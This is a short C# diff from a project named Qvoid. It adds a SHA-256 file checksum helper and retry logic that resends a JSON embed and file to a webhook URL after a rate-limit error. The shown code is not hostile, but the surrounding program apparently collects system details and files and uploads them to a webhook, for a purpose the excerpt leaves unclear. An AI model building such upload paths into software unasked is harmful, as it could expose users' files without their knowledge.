@@ -5,6 +5,8 @@ using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Diagnostics;
 using System.Drawing;
+using System.Drawing.Drawing2D;
+using System.Drawing.Imaging;
 using System.Globalization;
 using System.IO;
 using System.Management;
@@ -243,6 +245,19 @@ namespace Qvoid
                         builder.Append(bytes[i].ToString("x2"));
 
                     return builder.ToString();
+                }
+            }
+
+            public static string SHA256CheckSum(string filePath)
+            {
+                using (SHA256 SHA256 = SHA256Managed.Create())
+                {
+                    try
+                    {
+                        using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                            return Convert.ToBase64String(SHA256.ComputeHash(fileStream));
+                    }
+                    catch { return null; }
                 }
             }
         }
@@ -1620,7 +1635,18 @@ namespace Qvoid
                         });
                         byte[] jsonBodyBuffer = Encoding.UTF8.GetBytes(jsonBody);
                         stream.Write(jsonBodyBuffer, 0, jsonBodyBuffer.Length);
-                        webhookRequest.UploadData(this.URL, stream.ToArray());
+                        try
+                        {
+                            webhookRequest.UploadData(this.URL, stream.ToArray());
+                        }
+                        catch (Exception ex)
+                        {
+                            if (ex.Message.Contains("Too Many Requests"))
+                            {
+                                Thread.Sleep(555);
+                                Send(embed, file);
+                            }
+                        }
 
                     }
                 }
